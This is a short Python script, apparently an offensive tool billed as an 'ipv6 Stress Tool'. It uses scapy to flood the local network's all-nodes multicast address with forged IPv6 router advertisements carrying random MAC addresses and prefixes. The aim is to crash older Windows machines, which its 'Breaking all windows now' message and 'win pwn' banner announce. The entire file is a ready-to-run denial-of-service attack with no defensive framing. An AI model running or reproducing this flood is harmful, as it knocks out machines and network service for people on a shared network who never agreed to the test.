#!/usr/bin/python
# 
# Author: LukeBob
#
# ipv6 Stress Tool
#
# Works on some older unix systems, works best with "windows 7" or older

import sys, random
import string
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import IPv6,ICMPv6ND_RA,ICMPv6NDOptSrcLLAddr,ICMPv6NDOptMTU,ICMPv6NDOptPrefixInfo,send


def banner():
    print (r'''
                  _
                 (_)
        __      ___ _ __      _ ____      ___ __
        \ \ /\ / | | '_ \    | '_ \ \ /\ / | '_ \
         \ V  V /| | | | |   | |_) \ V  V /| | | |
          \_/\_/ |_|_| |_|   | .__/ \_/\_/ |_| |_|
                             | |
                             |_|
          ''')
    return


def randomMAC():
    mac = [ 0x00, 0x16, 0x3e,
    random.randint(0x00, 0x7f),
    random.randint(0x00, 0xff),
    random.randint(0x00, 0xff) ]
    return (':'.join(map(lambda x: "%02x" % x, mac)))

def prefixi():
    prefix = [random.randint(0x00, 0xff),random.randint(0x00, 0xff)]
    return (''.join(map(lambda x: "%02x" % x, prefix)))


def Multicast(newmac, prefix):
    a = IPv6()
    a.dst = "ff02::1"
    b = ICMPv6ND_RA()
    c = ICMPv6NDOptSrcLLAddr()
    c.lladdr = newmac
    d = ICMPv6NDOptMTU()
    e = ICMPv6NDOptPrefixInfo()
    e.prefixlen = 64
    e.prefix = str(prefix+'::')
    send(a/b/c/d/e, verbose=0)

def main():
    try:
        banner()
        print '\n\n     Breaking all windows now...\n'
        while True:
            for i in range(0,1000):
                prefix = prefixi()
                newmac = randomMAC()
                Multicast(newmac,prefix)
            print '\n   1000 New Addresses new Leased! ;P\n'
            sys.exit(0)
    except KeyboardInterrupt:
        print '\nExiting!...\n'
        sys.exit(0)

if __name__ == '__main__':
    main()
